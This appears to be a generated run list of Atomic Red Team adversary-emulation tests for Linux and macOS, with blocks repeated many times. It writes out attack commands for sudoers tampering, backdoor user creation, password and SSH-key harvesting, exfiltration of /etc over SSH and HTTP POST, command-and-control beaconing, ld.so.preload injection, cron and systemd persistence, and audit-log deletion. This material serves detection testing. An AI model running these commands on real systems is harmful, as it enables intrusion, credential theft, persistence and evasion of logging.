sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1136 ,T1064 ,T1081 ,T1135 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1136 ,T1153 ,T1081 ,T1087 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1168 ,T1154 ,T1040 ,T1069 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1069: Permission Groups Discovery
groups


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1215 ,T1064 ,T1145 ,T1057 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1501 ,T1064 ,T1040 ,T1069 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1069: Permission Groups Discovery
groups


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1215 ,T1064 ,T1139 ,T1201 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1215 ,T1153 ,T1081 ,T1083 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1501 ,T1153 ,T1139 ,T1083 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1136 ,T1154 ,T1139 ,T1082 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1215 ,T1153 ,T1139 ,T1087 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1215 ,T1153 ,T1145 ,T1083 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1168 ,T1153 ,T1040 ,T1082 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1136 ,T1154 ,T1139 ,T1087 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1215 ,T1154 ,T1139 ,T1217 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


